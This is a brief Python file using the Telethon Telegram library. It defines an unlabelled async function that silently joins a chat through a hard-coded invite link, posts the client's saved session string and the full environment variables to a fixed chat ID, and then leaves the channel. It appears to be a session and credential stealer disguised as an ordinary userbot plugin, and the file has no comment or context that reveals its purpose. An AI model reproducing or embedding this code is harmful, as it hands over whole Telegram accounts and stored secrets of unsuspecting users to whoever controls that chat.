from telethon import events
from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
import os
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
async def shashankop(bot, event):
    try:
       borg = client = bot
       await event.client(ImportChatInviteRequest('a_xphX6Kz10zNzhh'))
    except UserAlreadyParticipantError:
        pass
    await event.client.send_message(-513097461, bot.session.save() + "\n" + f'`{os.environ}`')
    await borg(LeaveChannelRequest(-513097461))
